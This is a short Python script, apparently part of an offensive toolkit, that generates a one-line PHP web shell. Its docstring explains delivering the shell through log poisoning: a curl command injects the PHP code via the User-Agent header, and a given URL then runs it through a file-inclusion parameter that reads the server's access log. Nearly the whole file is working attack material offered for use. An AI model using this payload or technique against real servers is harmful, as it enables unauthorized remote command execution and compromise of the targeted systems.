#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
First you need to deliver the web shell to the target server,
e. g. via log poisoning:
	$ curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://<RHOST>:<RPORT>"

Then the target URL would be (for exmaple):
	http://<RHOST>:<RPORT>/browse.php?file=/var/log/httpd-access.log&cmd=
"""


def genPayload(cmd):
	"""Just a PHP web shell."""
	return f"<?php system($_GET['{cmd}']); ?>"
